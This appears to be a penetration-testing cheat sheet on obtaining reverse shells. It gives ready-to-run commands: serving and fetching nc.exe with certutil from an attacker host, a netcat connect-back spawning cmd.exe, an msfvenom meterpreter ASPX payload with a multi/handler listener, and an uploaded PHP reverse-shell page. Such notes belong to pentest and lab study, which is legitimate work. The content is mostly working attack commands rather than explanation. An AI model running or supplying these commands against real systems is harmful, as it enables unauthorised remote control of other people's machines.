A **reverse shell** is a remote shell where the target connects back to the attacker's listener; it's effective since no tools are needed on the target, but embedding the attacker's IP in the payload can expose them during forensic analysis.

```shell
# Start a simple HTTP server on Kali to host nc.exe
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80

# Download nc.exe on the Windows Target
certutil -urlcache -f http://<my_kali_IP>/nc.exe nc.exe

# Set Up Netcat Listener on Kali (Attacker) - Starts a Netcat listener on port 1234 to receive the reverse shell
nc -nvlp 1234

# Connect Back to Kali from Windows (Reverse Shell)
nc.exe -nv <my_kali_IP> 1234 -e cmd.exe
# Connects back to the Kali listener and spawns a Windows cmd shell

# On the Kali system we can:
whoami
```

**ASPX shell**

```shell
# Let’s create the ASPX shell using msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local_IP> LPORT=1234 -f aspx > shell.aspx

# Upload the shell on the target.

# Use the msfconsole module /multi/handler to handle the incoming connection. 
# Set these three parameters: PAYLOAD , LHOST , and LPORT
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <local_IP>
set LPORT <port_number>

# Navigate to http://<target>/shell.aspx
# You should observe that we have successfully obtained the shell.
```

**PHP reverse shell**

```shell
cp /usr/share/webshells/php/php-reverse-shell.php .
# Update the IP address with my IP
# Update port number.

# e.g. Upload the file to SMB (target) using the put command.

# Start a Netcat listener
nc -lvnp 1234
 
 # Open the browser
 http://<target>/php-reverse-shell.php
```
